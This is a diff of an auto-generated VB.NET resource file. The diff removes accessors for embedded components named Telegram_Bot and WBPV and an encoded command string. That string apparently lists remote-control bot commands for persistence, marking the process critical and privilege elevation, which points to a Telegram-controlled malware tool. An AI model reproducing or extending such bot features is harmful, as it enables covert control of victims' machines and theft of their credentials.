@@ -39,7 +39,7 @@ Namespace My.Resources
         Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
             Get
                 If Object.ReferenceEquals(resourceMan, Nothing) Then
-                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("StuBot.Resources", GetType(Resources).Assembly)
+                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("ChildBot.Resources", GetType(Resources).Assembly)
                     resourceMan = temp
                 End If
                 Return resourceMan
@@ -61,51 +61,12 @@ Namespace My.Resources
         End Property
         
         '''<summary>
-        '''  Looks up a localized resource of type System.Byte[].
+        '''  Looks up a localized resource of type System.Drawing.Bitmap.
         '''</summary>
-        Friend ReadOnly Property ChildBot() As Byte()
+        Friend ReadOnly Property BlankPng() As System.Drawing.Bitmap
             Get
-                Dim obj As Object = ResourceManager.GetObject("ChildBot", resourceCulture)
-                Return CType(obj,Byte())
-            End Get
-        End Property
-        
-        '''<summary>
-        '''  Looks up a localized string similar to KgAqACoAKgAqAD7Y6d0gADXY0tw12PXcNdjy3DXY7tw12PfcNdj93CAANdjS3DXY+Nw12PfcNdj93DXY+9w12PjcNdj13CAACgA92OHeIAAvAHMAcABjACAALQAgAHMAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGMAcgBpAHQAaQBjAGEAbAAoAFUAQQBDACkACgA+2PHdIAAvAHUAcwBwAGMAIAAtACAAZABlAGwAIABwAHIAbwBjAGUAcwBzACAAYwByAGkAdABpAGMAYQBsACgAVQBBAEMAKQAKAJkmD/4gAC8AcwBlAHQAcwB0AGEAcgB0AHUAcAAgAC0AIABzAGUAdAAgAHMAdABhAHIAdAB1AHAAIAAKAJkmD/4gAC8AdQBuAHMAZQB0AHMAdABhAHIAdAB1AHAAIAAtACAAZABlAGwAIABzAHQAYQByAHQAdQBwACAACgA8IA/+IAAvAGUAbABlAHYAYQB0AGUAIAAtACAARwBlAHQAIABBAGQA [rest of string was truncated]&quot;;.
-        '''</summary>
-        Friend ReadOnly Property Cmd() As String
-            Get
-                Return ResourceManager.GetString("Cmd", resourceCulture)
-            End Get
-        End Property
-        
-        '''<summary>
-        '''  Looks up a localized resource of type System.Byte[].
-        '''</summary>
-        Friend ReadOnly Property Newtonsoft_Json() As Byte()
-            Get
-                Dim obj As Object = ResourceManager.GetObject("Newtonsoft_Json", resourceCulture)
-                Return CType(obj,Byte())
-            End Get
-        End Property
-        
-        '''<summary>
-        '''  Looks up a localized resource of type System.Byte[].
-        '''</summary>
-        Friend ReadOnly Property Telegram_Bot() As Byte()
-            Get
-                Dim obj As Object = ResourceManager.GetObject("Telegram_Bot", resourceCulture)
-                Return CType(obj,Byte())
-            End Get
-        End Property
-        
-        '''<summary>
-        '''  Looks up a localized resource of type System.Byte[].
-        '''</summary>
-        Friend ReadOnly Property WBPV() As Byte()
-            Get
-                Dim obj As Object = ResourceManager.GetObject("WBPV", resourceCulture)
-                Return CType(obj,Byte())
+                Dim obj As Object = ResourceManager.GetObject("BlankPng", resourceCulture)
+                Return CType(obj,System.Drawing.Bitmap)
             End Get
         End Property
     End Module
